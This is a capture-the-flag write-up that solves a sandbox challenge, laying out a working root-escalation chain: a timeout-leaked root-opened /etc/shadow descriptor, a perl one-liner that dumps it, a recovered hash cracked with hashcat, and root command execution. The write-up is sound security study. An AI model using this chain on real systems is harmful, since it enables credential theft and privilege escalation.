# SotoLambda — AUTH-as-root SOLVED (root + flag)

**FLAG: `avito{Ea5Y_fIL3_DE5CrIP70R_l3ak}`**

Recovered 2026-07-19 against `https://elflambda-ut90k5e8.avitoctf.ru`. The flag
name ("Easy file descriptor leak") confirms the intended path exactly: a leaked
root-opened `/etc/shadow` file descriptor.

The earlier NOTES.md/OPTIONS_NOTES.md rounds were wrong on two assumptions that
turned out to be the whole game:

1. **They assumed root was locked.** It is NOT. Root's shadow entry is a plain,
   crackable traditional **DES crypt** hash. (You cannot know this without
   reading `/etc/shadow`, which those rounds never managed to do.)
2. **They wrote off the timeout/`siglongjmp` path as "no primitive".** It is the
   primitive: a `SIGALRM` `siglongjmp` skips the close of the worker's
   root-opened `/etc/shadow` fd, leaking it, and that fd (opened with no
   `O_CLOEXEC`) is inherited by our later dropped-privilege child.

The remote-shadow-fetch (`popen("curl ...","rb")` → `fileno(NULL)`) really is a
dead red-herring branch (the `"rb"` mode makes `popen` return NULL on glibc, so
it can only crash) — it was never the way in. Root was reachable purely locally.

---

## The two bugs that combine

### Bug A — timeout leaks the root-opened `/etc/shadow` fd (persistent worker)

Every `handle_request()` the worker (running as **root**) does, right after
`fgets()` and *before* the per-job timer is even armed:

```
24f8: lea rdi,[rip+0x4b1d]   # "/etc/shadow"
2501: call open@plt          # O_RDONLY, flags=0  -> NO O_CLOEXEC
2506: mov ebp, eax           # shadow fd kept in EBP for the whole request
```

On the normal path this `ebp` fd is closed later (child closes it at VA `0x2c1f`
before `execv`; parent closes it after `fork`; error paths close it too).

But the job timeout is implemented with `setitimer(ITIMER_REAL)` +
`sigsetjmp`/`siglongjmp`:

```
alarm_handler (0x2420):
  2430: timed_out = 1
  243a: siglongjmp(timeout_jmp, 1)   ->  returns to sigsetjmp at 0x24d0

timeout-return block (0x2678):
  2698: setitimer(...,0,...)         # disarm
  26a5..26c6: if active_child>0: kill(child,9); waitpid(child)
  26d0..26f4: close parent_stdin_fd / parent_stdout_fd / parent_stderr_fd (only if >=0)
  2706: printf timeout error
  2717: jmp 0x24dd                   # back to fgets, next request
```

**Nowhere in that block is `ebp` (the `/etc/shadow` fd) closed.** So every
request that times out leaks exactly one root-opened `/etc/shadow` fd into the
long-lived worker. They stack: fd 4, 5, 6, … one per timeout.

Confirmed live: after N timeout requests the worker holds N `/etc/shadow` fds
(a later child saw fd 3..26 all → `/etc/shadow`).

### Bug B — leaked fds inherit across `execv` into the dropped-priv child

The child only explicitly closes the **current** request's tracked shadow fd
(one fd number, VA `0x2c1f`). The pipe halves are `O_CLOEXEC`. But the *leaked*
fds from prior timeouts are (a) different fd numbers the child never closes and
(b) opened without `O_CLOEXEC`, so `execv` keeps them open. Our uploaded ELF
therefore starts life with a fistful of inherited fds that were opened **by
root**, each pointing at `/etc/shadow`.

DAC is checked at `open()` time, not at `read()` time — root opened them, so our
runner-uid child can `read()` them regardless of the `0640 root:shadow` perms.

---

## Full exploit chain (end to end)

Live API (`/api/config` → `runner`/`runner`):
- `POST /api/upload` (multipart `file`) → `binary_id`
- `POST /api/invoke` `{binary_id, args, stdin, auth:{login,password},
  sandbox_settings:{memory_mb, timeout_ms}}` → runs the ELF, feeds `stdin`,
  returns `{result:{stdout,stderr,exit_code,timed_out,...}}`.

Uploaded artifact: `sotolambda/shell.elf` (159 bytes; raw `execve("/bin/sh")`,
so its `stdin` is executed as a shell script).

**Step 1 — leak.** Fire many `/api/invoke` with a guaranteed timeout:
`timeout_ms=1`, `stdin="sleep 3\n"`, `auth=runner/runner`. Each returns
`timed_out:true` and leaks one `/etc/shadow` fd. `elflambda` round-robins ~4
persistent workers, so spraying ~48–72 timeouts loads every worker.
(Keep the batch modest — leaking past the worker's own `RLIMIT_NOFILE` would
make its next `open("/etc/shadow")` fail and hit the `popen("rb")`/`fileno(NULL)`
crash, respawning the worker and wiping the leaks.)

**Step 2 — read.** Send one *normal* invoke (`timeout_ms=1000`) whose `stdin`
seeks each inherited fd to 0 and dumps it. `dash`/`cat <&N` did NOT work: the
auth path does `fdopen(dup(shadow_fd))` and `dup` **shares the file offset**, so
the leaked fds sit at `pos:616` (EOF of the 616-byte file). The shell can't
`lseek`. The box has **perl**, which can:

```perl
perl -e '
for my $n (3..200){
  open(my $F, "<&=" . $n) or next;   # bind filehandle to inherited fd n (no re-open)
  my $pos = sysseek($F,0,0);          # lseek(n,0,SEEK_SET) -> reset to start
  next unless defined $pos;
  my $buf=""; my $r=sysread($F,$buf,65536);
  next unless $r && $buf =~ /:/;      # shadow-shaped
  print "###FD".$n." len=".$r."\n".$buf; last;
}'
```

Because all workers are loaded, the first read that lands on any of them dumps
`/etc/shadow`.

**Step 3 — `/etc/shadow` (recovered live):**

```
root:azMuiLc/ZPwrM:20648:0:99999:7:::                      <-- 13-char DES crypt, NOT locked
daemon:*:...  bin:*:...  ... nobody:*:...                  <-- all system accts locked (*)
runner:$6$rNGtelfl4mbda$Xpqr.0EL...OwrCW0:20648:0:99999:7:::  <-- sha512crypt of "runner"
```

**Step 4 — crack root.** `azMuiLc/ZPwrM` is descrypt (hashcat `-m 1500`, salt
`az`). rockyou hit instantly:

```
hashcat -m 1500 root.hash rockyou.txt  ->  azMuiLc/ZPwrM:mole
```

Root password = **`mole`** (DES only keys on the first 8 chars).

**Step 5 — become root.** The worker never refuses any username; it authenticates
`login` against local `/etc/shadow` with `crypt()`/`strcmp` and, being root
itself, `setresuid(0,0,0)` is a no-op, then `execv`s our ELF as root:

```json
{"binary_id":"<shell.elf>","args":[],"stdin":"cat /root/flag.txt\n",
 "auth":{"login":"root","password":"mole"},
 "sandbox_settings":{"memory_mb":64,"timeout_ms":2000}}
```

Response:
```
uid=0(root) gid=0(root) groups=0(root)
avito{Ea5Y_fIL3_DE5CrIP70R_l3ak}
```

`/root/flag.txt` is `-rw------- root:root`, 32 bytes.

---

## Reproduce

Driver + scripts live in the session scratchpad; the essential Python is trivial
(`urllib` POSTs). Minimal recipe:

1. `POST /api/upload` with `sotolambda/shell.elf` → `BID`.
2. Leak: ~50× `POST /api/invoke` `{BID, stdin:"sleep 3\n",
   auth:{runner,runner}, sandbox_settings:{memory_mb:64, timeout_ms:1}}`.
3. Read: `POST /api/invoke` `{BID, stdin:<perl one-liner above>,
   auth:{runner,runner}, sandbox_settings:{memory_mb:64, timeout_ms:1000}}`;
   retry a handful of times until one child lands on a loaded worker.
4. `hashcat -m 1500` the root hash → `mole`.
5. `POST /api/invoke` `{BID, stdin:"cat /root/flag.txt\n",
   auth:{login:"root", password:"mole"}, ...}`.

## Notes / gotchas that mattered

- **Do not `cat /proc/self/fd/N` or `dd if=/proc/self/fd/N`.** Those *re-open*
  `/etc/shadow` as runner → `EACCES`. You must read the **existing** inherited
  fd (shared open-file-description), i.e. `perl open("<&=N")` / a raw
  `read()` on the fd number — no re-open.
- The leaked fds are at EOF (`dup` shares the offset with the auth read), so an
  `lseek(fd,0,SEEK_SET)` is mandatory before reading — hence perl, not shell.
- Keep leak batches under the worker's `RLIMIT_NOFILE`; over-leaking crashes the
  worker via the unrelated `popen("rb")`→`fileno(NULL)` bug and resets state.
- `memory_mb`/`timeout_ms` are validated by `elflambda`; out-of-range (e.g.
  `memory_mb=128`, `timeout_ms=5000`) returns `{"error":"bad_settings"}`. Stick
  to defaults (`memory_mb=64`, `timeout_ms<=~2000`).
